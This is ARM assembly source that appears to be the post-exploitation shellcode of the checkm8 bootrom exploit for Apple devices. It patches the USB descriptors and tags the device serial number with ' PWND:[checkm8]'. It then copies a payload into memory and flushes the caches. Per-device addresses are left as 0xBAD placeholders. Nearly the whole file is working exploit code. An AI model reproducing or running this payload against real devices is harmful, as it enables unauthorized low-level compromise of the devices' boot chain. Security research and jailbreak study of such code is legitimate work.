.text

.pool
.set PAYLOAD_OFFSET,               0xBAD00006
.set PAYLOAD_SIZE,                 0xBAD00007
.set PAYLOAD_DEST,                 0xBAD00005
.set PAYLOAD_PTR,                  0xBAD00008
.set gUSBSerialNumber,             0xBAD00002
.set gUSBSRNMStringDescriptor,     0xBAD00004
.set gUSBDescriptors,              0xBAD00001
.set usb_create_string_descriptor, 0xBAD00003

.code 32
.global _main
_main:
  MOV  R4, #0                 // HACK: do not free this usb request
  PUSH {R4-R7,LR}

  LDR  R0, =gUSBDescriptors
  LDRD R0, R1, [R0]
  ADR  R2, USB_DESCRIPTOR
  LDRD R4, R5, [R2]
  STRD R4, R5, [R0]
  STRD R4, R5, [R1]
  LDRD R4, R5, [R2,#0x8]
  STRD R4, R5, [R0,#0x8]
  STRD R4, R5, [R1,#0x8]
  LDRD R4, R5, [R2,#0x10]
  STRD R4, R5, [R0,#0x10]
  STRD R4, R5, [R1,#0x10]
  LDRD R4, R5, [R2,#0x18]
  STRD R4, R5, [R0,#0x18]
  STRD R4, R5, [R1,#0x18]

  LDR  R0, =gUSBSerialNumber
find_zero_loop:
  ADD  R0, R0, #1
  LDRB R1, [R0]
  CMP  R1, #0
  BNE  find_zero_loop

  ADR  R1, PWND_STRING
  LDR  R2, [R1]
  LDR  R3, [R1,#0x4]
  STR  R2, [R0]
  STR  R3, [R0,#0x4]
  LDR  R2, [R1,#0x8]
  LDR  R3, [R1,#0xC]
  STR  R2, [R0,#0x8]
  STR  R3, [R0,#0xC]

  LDR  R0, =gUSBSerialNumber
  LDR  R1, =usb_create_string_descriptor
  LDR  R4, =gUSBSRNMStringDescriptor
  BLX  R1
  STRB R0, [R4]

  LDR  R0, =PAYLOAD_DEST
  ADR  R1, _main
  LDR  R2, =PAYLOAD_OFFSET
  ADD  R1, R1, R2
  MOV  R2, #0
  LDR  R3, =PAYLOAD_SIZE
  LDR  R4, =PAYLOAD_PTR
  ADD  R5, R0, #0x9
  STR  R5, [R4]

copy_loop:
  LDRD R4, R5, [R1]
  STRD R4, R5, [R0]
  LDRD R4, R5, [R1,#0x8]
  STRD R4, R5, [R0,#0x8]
  LDRD R4, R5, [R1,#0x10]
  STRD R4, R5, [R0,#0x10]
  LDRD R4, R5, [R1,#0x18]
  STRD R4, R5, [R0,#0x18]
  LDRD R4, R5, [R1,#0x20]
  STRD R4, R5, [R0,#0x20]
  LDRD R4, R5, [R1,#0x28]
  STRD R4, R5, [R0,#0x28]
  LDRD R4, R5, [R1,#0x30]
  STRD R4, R5, [R0,#0x30]
  LDRD R4, R5, [R1,#0x38]
  STRD R4, R5, [R0,#0x38]
  MCR  p15, 0, R0,c7,c14, 1
  DMB  SY
  ADD  R0, R0, #0x40
  ADD  R1, R1, #0x40
  ADD  R2, R2, #0x40
  CMP  R2, R3
  BCC  copy_loop

  MOV  R0, #0
  MCR  p15, 0, R0, c7, c5, 0 
  DSB
  ISB

  POP  {R4-R7,PC}

USB_DESCRIPTOR:
.word 0x190209, 0x80050101, 0x409fa, 0x1fe0000, 0x21070000, 0xa01, 0x8, 0x0

PWND_STRING:
.asciz " PWND:[checkm8]"
